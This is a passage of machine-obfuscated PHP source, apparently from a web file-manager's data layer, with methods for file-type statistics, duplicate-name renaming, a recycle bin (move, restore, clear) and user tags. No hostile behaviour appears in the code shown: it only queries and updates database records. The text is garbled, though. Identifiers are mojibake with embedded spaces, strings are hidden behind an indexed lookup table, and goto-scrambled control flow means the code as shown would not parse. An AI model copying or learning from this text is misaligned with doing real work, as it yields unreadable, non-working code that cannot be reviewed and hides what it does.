Model($dšäóÏŸö„[403])->field($dšäóÏŸö„[391])->where($eóÆšªŞÈ–)->select(); goto F‰ãœÍçäš; B·Üó”Ì ˜: return $eÓÆÁŠÌØê; goto EØ‡¸†ˆ†Ó; EØ‡¸†ˆ†Ó: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($f™’ƒ³†°œ) { return $this->fileTypeProfile($f™’ƒ³†°œ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($FàŞ¨¯½) { return $this->fileTypeProfile($FàŞ¨¯½, SourceModel::TYPE_GROUP); } private function fileTypeProfile($e˜®ÈğõÛ¹, $AóÎ‡¾¤‡) { goto bĞğ×å¶Ä‰; D«ğŒÒ‚: if ($e½ÕğÙùö¾) { return $e½ÕğÙùö¾; } $Bå½…´Ëß§ = array($F×Ä³„§ø›[526] => 0); if ($e˜®ÈğõÛ¹ != !1) { $Bå½…´Ëß§[$F×Ä³„§ø›[464]] = $e˜®ÈğõÛ¹; $Bå½…´Ëß§[$F×Ä³„§ø›[379]] = $AóÎ‡¾¤‡; } goto añíáÖ±£; añíáÖ±£: $BÉõÖÚ“Øù = array(); $BÉõÖÚ“Øù[$F×Ä³„§ø›[2366]] = array($F×Ä³„§ø›[2367] => LNG($F×Ä³„§ø›[2366]), $F×Ä³„§ø›[2368] => $this->where($Bå½…´Ëß§)->count(), $F×Ä³„§ø›[528] => $this->where($Bå½…´Ëß§)->sum($F×Ä³„§ø›[87])); $C¦”íˆ®ïˆ = KodIO::fileTypeList(); goto bæŞîÂ¥öß; bæŞîÂ¥öß: foreach ($C¦”íˆ®ïˆ as $bëÚåÍ½° => $bœÎš¾Ã¸‡) { $Bå½…´Ëß§[$F×Ä³„§ø›[380]] = $this->fileTypeWhere($bëÚåÍ½°); $BÉõÖÚ“Øù[$bëÚåÍ½°] = array($F×Ä³„§ø›[2367] => $bœÎš¾Ã¸‡[$F×Ä³„§ø›[28]], $F×Ä³„§ø›[2368] => $this->where($Bå½…´Ëß§)->count(), $F×Ä³„§ø›[528] => $this->where($Bå½…´Ëß§)->sum($F×Ä³„§ø›[87])); } Cache::set($Eí¥ÆòáÑÅ, $BÉõÖÚ“Øù, 1200); return $BÉõÖÚ“Øù; goto c»‡¹ˆ²ÉË; bĞğ×å¶Ä‰: $F×Ä³„§ø› =& $_SERVER[¶ªÕß‚ØÁŸ]; $Eí¥ÆòáÑÅ = $F×Ä³„§ø›[2365] . $e˜®ÈğõÛ¹ . $F×Ä³„§ø›[80] . $AóÎ‡¾¤‡; $e½ÕğÙùö¾ = Cache::get($Eí¥ÆòáÑÅ); goto D«ğŒÒ‚; c»‡¹ˆ²ÉË: } public function fileNameExist($D”Ÿ¹Öº¶, $EÕ‚æ¾®†º) { $Fßİ¬ƒè¡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fÌÉ´ìÚŒ† = $this->childList($D”Ÿ¹Öº¶); foreach ($fÌÉ´ìÚŒ† as $Dƒ³¯è ) { if ($Dƒ³¯è [$Fßİ¬ƒè¡[28]] == $EÕ‚æ¾®†º) { return $Dƒ³¯è [$Fßİ¬ƒè¡[377]]; } } return !1; } public function childList($CÏà­“¡) { goto BÀùñáê„…; EÇ¿äñ¢Õ: self::$cacheChildList[$eŒÔ±–ç ¤] = $E³öÖ˜Å›â; foreach ($E³öÖ˜Å›â as $BêéœÒÈ©²) { $eŒÔ±–ç ¤ = $BŒË»­Šôø[418] . $BêéœÒÈ©²[$BŒË»­Šôø[377]]; self::$cacheSourceInfo[$eŒÔ±–ç ¤] = $BêéœÒÈ©²; } return $E³öÖ˜Å›â; goto eœÆî‰Ã°; aùŒ÷£Ç×µ: $F™âÜ—†ŒÅ = array($BŒË»­Šôø[469] => intval($CÏà­“¡), $BŒË»­Šôø[405] => 0); $E³öÖ˜Å›â = $this->where($F™âÜ—†ŒÅ)->select(); $E³öÖ˜Å›â = $E³öÖ˜Å›â ? $E³öÖ˜Å›â : array(); goto EÇ¿äñ¢Õ; BÀùñáê„…: $BŒË»­Šôø =& $_SERVER[¶ªÕß‚ØÁŸ]; $eŒÔ±–ç ¤ = $BŒË»­Šôø[2342] . $CÏà­“¡; if (isset(self::$cacheChildList[$eŒÔ±–ç ¤])) { return self::$cacheChildList[$eŒÔ±–ç ¤]; } goto aùŒ÷£Ç×µ; eœÆî‰Ã°: } public function fileNameAuto($b‰š¶Õƒù÷, $D³´¹£Û˜®, $b‡µÉ’¿ = REPEAT_RENAME, $DÚèÇ°ã¥Ó = false) { $Cœ¯—· Œ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aÈÁíÇ„Ç = $this->childList($b‰š¶Õƒù÷); $F¬óœøõÖ— = array_to_keyvalue($aÈÁíÇ„Ç, $Cœ¯—· Œ[33], $Cœ¯—· Œ[28]); return $this->fileNameAutoGet($F¬óœøõÖ—, $D³´¹£Û˜®, $b‡µÉ’¿, $DÚèÇ°ã¥Ó); } public function fileNameAutoGet($bêåĞòÊˆğ, $EÅíğ¾—§, $b§Ğçœ¥î, $AùöŠ¨¾¥ ) { $F£İ¼ïêÔ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($b§Ğçœ¥î == REPEAT_REPLACE || !$bêåĞòÊˆğ || !in_array_not_case($EÅíğ¾—§, $bêåĞòÊˆğ) || $AùöŠ¨¾¥  && $b§Ğçœ¥î != REPEAT_RENAME_FOLDER) { return $EÅíğ¾—§; } if ($b§Ğçœ¥î == REPEAT_SKIP) { return !1; } $bÖƒÇŒ‡Ó = $F£İ¼ïêÔ[101] . get_path_ext($EÅíğ¾—§); $bÖƒÇŒ‡Ó = $bÖƒÇŒ‡Ó == $F£İ¼ïêÔ[101] || $AùöŠ¨¾¥  ? $F£İ¼ïêÔ[33] : $bÖƒÇŒ‡Ó; for ($f¶¹ãæ»† = 1; $f¶¹ãæ»† <= count($bêåĞòÊˆğ) + 1; $f¶¹ãæ»†++) { $EäâµêÇÄ° = substr($EÅíğ¾—§, 0, strlen($EÅíğ¾—§) - strlen($bÖƒÇŒ‡Ó)); $f¢íø¿–»ä = $EäâµêÇÄ° . "\x28{$f¶¹ãæ»†}\x29{$bÖƒÇŒ‡Ó}"; if (!in_array_not_case($f¢íø¿–»ä, $bêåĞòÊˆğ)) { return $f¢íø¿–»ä; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\x72\143\145\137\x72\145\x63\x79\143\154\x65"; protected $dataAuto = array(array("\x63\162\145\141\164\145\x54\x69\155\x65", "\164\151\x6d\145", "\151\156\x73\145\162\164", "\x66\165\156\143\164\151\x6f\156")); public function listData($eèƒòœğÏ† = false) { $A³ã ÌêŠ¨ =& $_SERVER[¶ªÕß‚ØÁŸ]; $eèƒòœğÏ† = $eèƒòœğÏ† ? $eèƒòœğÏ† : USER_ID; $Eåğ¹„Î¸ó = $this->where(array($A³ã ÌêŠ¨[1431] => $eèƒòœğÏ†))->select(); return array_to_keyvalue($Eåğ¹„Î¸ó, $A³ã ÌêŠ¨[33], $A³ã ÌêŠ¨[377]); } public function moveToRecycle($BÙ†ÏŠ—¬) { goto a©á¬Ü÷ÄÚ; a©á¬Ü÷ÄÚ: $fäÕµÈãàÑ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Fé—×Ãëƒç = Model($fäÕµÈãàÑ[1121]); $F¶ªÑÏçİÅ = $Fé—×Ãëƒç->sourceInfo($BÙ†ÏŠ—¬); goto b£Ä—­š»; D›İÓ»ŸÍà: $this->recycleMove($BÙ†ÏŠ—¬, 1); if ($F¶ªÑÏçİÅ[$fäÕµÈãàÑ[378]] == $fäÕµÈãàÑ[93]) { $BŸ—°èĞËœ = array($fäÕµÈãàÑ[533] => array($fäÕµÈãàÑ[491], $F¶ªÑÏçİÅ[$fäÕµÈãàÑ[467]] . $BÙ†ÏŠ—¬ . $fäÕµÈãàÑ[492])); $Fé—×Ãëƒç->where($BŸ—°èĞËœ)->setField($fäÕµÈãàÑ[405], 1); } goto fÜ¿¡„ÏÃÀ; b£Ä—­š»: if (!$F¶ªÑÏçİÅ || $F¶ªÑÏçİÅ[$fäÕµÈãàÑ[405]] == $fäÕµÈãàÑ[93]) { return; } $E›ô“‘éĞâ = array($fäÕµÈãàÑ[391] => $BÙ†ÏŠ—¬, $fäÕµÈãàÑ[1431] => USER_ID, $fäÕµÈãàÑ[529] => $F¶ªÑÏçİÅ[$fäÕµÈãàÑ[379]], $fäÕµÈãàÑ[530] => $F¶ªÑÏçİÅ[$fäÕµÈãàÑ[464]], $fäÕµÈãàÑ[533] => $F¶ªÑÏçİÅ[$fäÕµÈãàÑ[467]]); $this->add($E›ô“‘éĞâ); goto D›İÓ»ŸÍà; fÜ¿¡„ÏÃÀ: } public function clear() { $this->remove(!1); } public function remove($AËïÈ¶  = false) { goto b½‹Øç‡âÈ; E“ï¤œ±Íª: $AËïÈ¶  = $AËïÈ¶  === !1 ? !1 : $AËïÈ¶ ; $D¿­µÜãƒ– = array(); foreach ($cŒÛ°ò¿ëÍ as $FŒ¶…Á†¤£) { if ($AËïÈ¶  != !1 && !in_array($FŒ¶…Á†¤£, $AËïÈ¶ )) { continue; } $fäĞ‹“ô÷Í->remove($FŒ¶…Á†¤£, !1); $a•÷àùï’° = $this->where(array($cÄÖµĞ¥‘[377] => $FŒ¶…Á†¤£))->find(); $Dï“ïÔ†” = $a•÷àùï’°[$cÄÖµĞ¥‘[379]] . $cÄÖµĞ¥‘[80] . $a•÷àùï’°[$cÄÖµĞ¥‘[464]]; $D¿­µÜãƒ–[$Dï“ïÔ†”] = array($cÄÖµĞ¥‘[529] => $a•÷àùï’°[$cÄÖµĞ¥‘[379]], $cÄÖµĞ¥‘[464] => $a•÷àùï’°[$cÄÖµĞ¥‘[464]]); $this->where(array($cÄÖµĞ¥‘[377] => $FŒ¶…Á†¤£))->delete(); } goto b¸À£ÂÃÉö; b¸À£ÂÃÉö: foreach ($D¿­µÜãƒ– as $F´ˆŸäöË‰) { $fäĞ‹“ô÷Í->targetSpaceUpdate($F´ˆŸäöË‰[$cÄÖµĞ¥‘[379]], $F´ˆŸäöË‰[$cÄÖµĞ¥‘[464]]); } goto eñßä«÷ÈÏ; b½‹Øç‡âÈ: $cÄÖµĞ¥‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fäĞ‹“ô÷Í = Model($cÄÖµĞ¥‘[1121]); $cŒÛ°ò¿ëÍ = $this->listData(); goto E“ï¤œ±Íª; eñßä«÷ÈÏ: } public function restore($A›ƒº¡·¶ = false) { goto F¯³£È·; fÔá¤êğ¾: foreach ($fàÂší†ù as $CÑâèä•Îë) { goto dÒó˜Ş½ÅÚ; FìÉéÏÈ¨»: if ($AÒ›ƒÌ•™¯[$F­âçÃ’ì[405]] == $F­âçÃ’ì[93]) { continue; } $b––á·‡éï->lockMoveStart($CÑâèä•Îë); $this->recycleMove($CÑâèä•Îë, 0); goto Cß¸„è·¶; Eõ¡ºÖœ„Æ: $c“µ¢èÕêÃ[] = $få‘¶óÜ†[$F­âçÃ’ì[469]]; if ($få‘¶óÜ†[$F­âçÃ’ì[378]] == $F­âçÃ’ì[93]) { $c“µ¢èÕêÃ[] = $CÑâèä•Îë; } $b––á·‡éï->lockMoveEnd($CÑâèä•Îë); goto eÒè¿ŸŒî; Cß¸„è·¶: if ($få‘¶óÜ†[$F­âçÃ’ì[378]] == $F­âçÃ’ì[93]) { $fĞèŸÄµ‰ = array($F­âçÃ’ì[533] => array($F­âçÃ’ì[491], $få‘¶óÜ†[$F­âçÃ’ì[467]] . $CÑâèä•Îë . $F­âçÃ’ì[492])); $b––á·‡éï->where($fĞèŸÄµ‰)->setField($F­âçÃ’ì[405], 0); $this->restoreFolderChildren($CÑâèä•Îë, $fàÂší†ù); } $this->where(array($F­âçÃ’ì[377] => $CÑâèä•Îë))->delete(); $b––á·‡éï->folderSizeReset($få‘¶óÜ†[$F­âçÃ’ì[469]]); goto Eõ¡ºÖœ„Æ; dÒó˜Ş½ÅÚ: if ($A›ƒº¡·¶ != !1 && !in_array($CÑâèä•Îë, $A›ƒº¡·¶)) { continue; } $få‘¶óÜ† = $b––á·‡éï->sourceInfo($CÑâèä•Îë); $AÒ›ƒÌ•™¯ = $b––á·‡éï->sourceInfo($få‘¶óÜ†[$F­âçÃ’ì[469]]); goto FìÉéÏÈ¨»; eÒè¿ŸŒî: } $b––á·‡éï->updateModifyTime($c“µ¢èÕêÃ); goto BàôœÖŒƒ; cÛ¥³ÎºàÖ: $A›ƒº¡·¶ = $A›ƒº¡·¶ == !1 ? !1 : $A›ƒº¡·¶; if (!$fàÂší†ù) { return !0; } $c“µ¢èÕêÃ = array(); goto fÔá¤êğ¾; F¯³£È·: $F­âçÃ’ì =& $_SERVER[¶ªÕß‚ØÁŸ]; $b––á·‡éï = Model($F­âçÃ’ì[1121]); $fàÂší†ù = $this->listData(); goto cÛ¥³ÎºàÖ; BàôœÖŒƒ: } private function restoreFolderChildren($F»ù£šª•Î, $F§††œÆ¯°) { goto Bö†‚Ì¶éÅ; fš¤°ææë›: $cÊÜöÖÖõ [$aÎ¸İ†åÁğ[377]][1] = array_unique($cÊÜöÖÖõ [$aÎ¸İ†åÁğ[377]][1]); $cÊÜöÖÖõ [$aÎ¸İ†åÁğ[920]] = $aÎ¸İ†åÁğ[2187]; $eÁİÜÌŸ×õ->where($cÊÜöÖÖõ )->setField($aÎ¸İ†åÁğ[405], 1); goto fòŒ†ê”È; B¨³ÙíŠ¡Ô: foreach ($F§††œÆ¯° as $bŠÜò¢ÊÀª) { if ($bŠÜò¢ÊÀª == $F»ù£šª•Î) { continue; } if (!$eÁİÜÌŸ×õ->isParentOf($F»ù£šª•Î, $bŠÜò¢ÊÀª)) { continue; } $A‘š‰ì‹ï = $eÁİÜÌŸ×õ->sourceInfo($bŠÜò¢ÊÀª); if ($A‘š‰ì‹ï[$aÎ¸İ†åÁğ[378]] == $aÎ¸İ†åÁğ[93]) { $cÊÜöÖÖõ [] = array($aÎ¸İ†åÁğ[533] => array($aÎ¸İ†åÁğ[491], $A‘š‰ì‹ï[$aÎ¸İ†åÁğ[467]] . $bŠÜò¢ÊÀª . $aÎ¸İ†åÁğ[492])); } else { $cÊÜöÖÖõ [$aÎ¸İ†åÁğ[377]][1][] = $bŠÜò¢ÊÀª; } } if (!$cÊÜöÖÖõ [$aÎ¸İ†åÁğ[377]][1]) { unset($cÊÜöÖÖõ [$aÎ¸İ†åÁğ[377]]); } if (!$cÊÜöÖÖõ ) { return; } goto fš¤°ææë›; Bö†‚Ì¶éÅ: $aÎ¸İ†åÁğ =& $_SERVER[¶ªÕß‚ØÁŸ]; $eÁİÜÌŸ×õ = Model($aÎ¸İ†åÁğ[1121]); $cÊÜöÖÖõ  = array($aÎ¸İ†åÁğ[377] => array($aÎ¸İ†åÁğ[7], array())); goto B¨³ÙíŠ¡Ô; fòŒ†ê”È: } private function recycleMove($fòõ ­‘”•, $dÂŠñ»” = 1) { $b¸·Îğ©‹„ =& $_SERVER[¶ªÕß‚ØÁŸ]; $FÕŒ³®À‘ = Model($b¸·Îğ©‹„[1121]); $FÉçÚ‡¤ = Model($b¸·Îğ©‹„[2369]); $F®µ‰†–Ú = array($b¸·Îğ©‹„[377] => $fòõ ­‘”•); if ($dÂŠñ»”) { $FÕŒ³®À‘->where($F®µ‰†–Ú)->setField($b¸·Îğ©‹„[405], 1); $FÉçÚ‡¤->eventRecycle($fòõ ­‘”•, $b¸·Îğ©‹„[2370]); } else { $eÂÇ¹òåà = $FÕŒ³®À‘->where($F®µ‰†–Ú)->find(); $b“ö÷äİ×Ÿ = $eÂÇ¹òåà[$b¸·Îğ©‹„[378]] == $b¸·Îğ©‹„[93]; $A‰¢µ—‘¦‚ = $FÕŒ³®À‘->fileNameAuto($eÂÇ¹òåà[$b¸·Îğ©‹„[469]], $eÂÇ¹òåà[$b¸·Îğ©‹„[28]], REPEAT_RENAME_FOLDER, $b“ö÷äİ×Ÿ); if ($A‰¢µ—‘¦‚ != $eÂÇ¹òåà[$b¸·Îğ©‹„[28]]) { $FÕŒ³®À‘->rename($fòõ ­‘”•, $A‰¢µ—‘¦‚); } $FÕŒ³®À‘->where($F®µ‰†–Ú)->setField($b¸·Îğ©‹„[405], 0); $FÉçÚ‡¤->eventRecycle($fòõ ­‘”•, $b¸·Îğ©‹„[2371]); } } } goto EÂ•‰ˆõ‚‰; cÅëÉï­ò: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\x66\141\x76"; protected function cacheFunctionAlias($EÅ†Œ“ãÚ÷) { $D˜°«ñ‡ô =& $_SERVER[¶ªÕß‚ØÁŸ]; return array($D˜°«ñ‡ô[2495] => array(USER_ID, $D˜°«ñ‡ô[2550])); } protected function listData() { $Eš±é†À‰ğ =& $_SERVER[¶ªÕß‚ØÁŸ]; $F­·¨½‡ƒ = array($Eš±é†À‰ğ[1431] => USER_ID, $Eš±é†À‰ğ[444] => array($Eš±é†À‰ğ[2551], 0)); $fÔĞÕî‘¯™ = $Eš±é†À‰ğ[2552]; $a»ôÏŞ¹‚ = $Eš±é†À‰ğ[2553]; $c‘ä›Ê§Úœ = $this->field($fÔĞÕî‘¯™)->where($F­·¨½‡ƒ)->order($a»ôÏŞ¹‚)->select(); return $c‘ä›Ê§Úœ ? $c‘ä›Ê§Úœ : array(); } protected function listByTag($e‚ÅÜŠ¾Şğ) { } protected function addToTag($B©ÚÑîåˆ, $Aßá­èŠÔš) { $eğİ ×à²ñ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!Model($eğİ ×à²ñ[2317])->listData($Aßá­èŠÔš) || !Model($eğİ ×à²ñ[766])->pathInfo($B©ÚÑîåˆ)) { return !1; } $Eå…¿ßÙ­à = array($eğİ ×à²ñ[1431] => USER_ID, $eğİ ×à²ñ[444] => $Aßá­èŠÔš, $eğİ ×à²ñ[395] => $B©ÚÑîåˆ, $eğİ ×à²ñ[396] => $eğİ ×à²ñ[390], $eğİ ×à²ñ[394] => $eğİ ×à²ñ[33], $eğİ ×à²ñ[2111] => 0); if ($this->where($Eå…¿ßÙ­à)->find()) { return !1; } return $this->add($Eå…¿ßÙ­à); } protected function removeFromTag($bŸ¶ÅÔÉÄŸ, $Bêò¡’¼ö) { $D¨æ‚Ù›ÏÚ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!Model($D¨æ‚Ù›ÏÚ[2317])->listData($Bêò¡’¼ö)) { return !1; } if (is_array($bŸ¶ÅÔÉÄŸ)) { $bŸ¶ÅÔÉÄŸ = array($D¨æ‚Ù›ÏÚ[7], $bŸ¶ÅÔÉÄŸ); } $fÂÏáè‚¥• = array($D¨æ‚Ù›ÏÚ[1431] => USER_ID, $D¨æ‚Ù›ÏÚ[444] => $Bêò¡’¼ö, $D¨æ‚Ù›ÏÚ[396] => $D¨æ‚Ù›ÏÚ[390], $D¨æ‚Ù›ÏÚ[395] => $bŸ¶ÅÔÉÄŸ); return $this->where($fÂÏáè‚¥•)->delete(); } protected function removeByTag($FËñºëà­õ) { $a‘¯ØŒØÏ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$FËñºëà­õ) { return !1; } $D×Íù°šáé = array($a‘¯ØŒØÏ[1431] => USER_ID, $a‘¯ØŒØÏ[444] => $FËñºëà­õ); return $this->where($D×Íù°šáé)->delete(); } protected function removeBySource($BƒÅ¹¢à) { $C²êµ“Ğˆ± =& $_SERVER[¶ªÕß‚ØÁŸ]; $bÙ†Æ èóÀ = array($C²êµ“Ğˆ±[1431] => USER_ID, $C²êµ“Ğˆ±[395] => $BƒÅ¹¢à, $C²êµ“Ğˆ±[444] => array($C²êµ“Ğˆ±[934], 0)); return $this->where($bÙ†Æ èóÀ)->delete(); } }